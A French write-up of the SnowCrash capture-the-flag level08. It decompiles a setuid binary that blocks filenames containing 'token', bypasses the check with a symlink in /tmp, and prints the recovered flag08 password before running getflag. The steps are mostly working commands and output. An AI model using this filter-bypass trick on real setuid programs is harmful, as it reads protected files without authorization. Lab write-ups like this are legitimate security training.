# Recherche des fichiers disponibles

Avec la commande **ls**, on trouve un fichier binaire **level08** et un fichier **token**.

```bash
level08@SnowCrash:~$ ls -l
total 16
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
```

Le flag est supposément dans le fichier **token**, mais on ne peut pas le lire.

En décompilant le binaire via le site [dogbolt](https://dogbolt.org).

On observe un main de ce style :

```c
int main(int argc, char** argv)
{
    void* gsbase;
    int eax_2 = *(gsbase + 0x14);

    if (argc == 1)
    {
        printf("%s [file to read]\n", *argv);
        exit(1);
    }

    if (strstr(argv[1], "token"))
    {
        printf("You may not access '%s'\n", argv[1]);
        exit(1);
    }

    int fd = open(argv[1], 0);

    if (fd == -1)
    {
        err(1, "Unable to open %s", argv[1]);
    }

    char buf[1024];
    ssize_t nbytes = read(fd, &buf, 1024);

    if (nbytes == -1)
    {
        err(1, "Unable to read fd %d", fd);
    }

    ssize_t result = write(1, &buf, nbytes);

    if (eax_2 == *(gsbase + 0x14))
        return result;

    __stack_chk_fail();
    /* no return */
}
```

En résumé, ce code ouvre un fichier et affiche son contenu, mais si le nom du fichier contient 'token', il affichera un message d'erreur.

```bash
level08@SnowCrash:~$ ./level08 token 
You may not access 'token'
```

Du coup, il faut trouver un moyen de référencer le fichier **token** sans que le nom contienne 'token'.

On peut réaliser cela avec un lien symbolique.

```bash
level08@SnowCrash:~$ ln -s ~/token /tmp/link
level08@SnowCrash:~$ ls -l /tmp/link
lrwxrwxrwx 1 level08 level08 24 XXX XX XX:XX /tmp/link -> /home/user/level08/token
```

Il reste plus qu'à faire :

```bash
level08@SnowCrash:~$ ./level08 /tmp/link
quif5eloekouj29ke0vouxean
```

Malheureusement, ce token n'est pas le mot de passe de **level09** mais celui de **flag08**.

Du coup, la dernière commande à faire est juste un **getflag** sur le compte de **flag08**.

```bash
su -c getflag - flag08
```
